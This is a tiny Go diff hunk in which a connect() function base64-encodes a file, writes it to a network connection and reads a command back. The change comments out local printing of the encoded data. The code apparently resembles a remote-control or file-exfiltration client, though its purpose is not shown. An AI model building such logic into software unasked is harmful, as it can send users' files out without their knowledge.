@@ -98,7 +98,7 @@ func connect() {
 
 			encData := base64.URLEncoding.EncodeToString(file)
 			conn.Write([]byte(string(encData) + "\n"))
-			fmt.Println(encData)
+			//fmt.Println(encData)
 			command, _ := bufio.NewReader(conn).ReadString('\n')
 			fmt.Println(command)
 
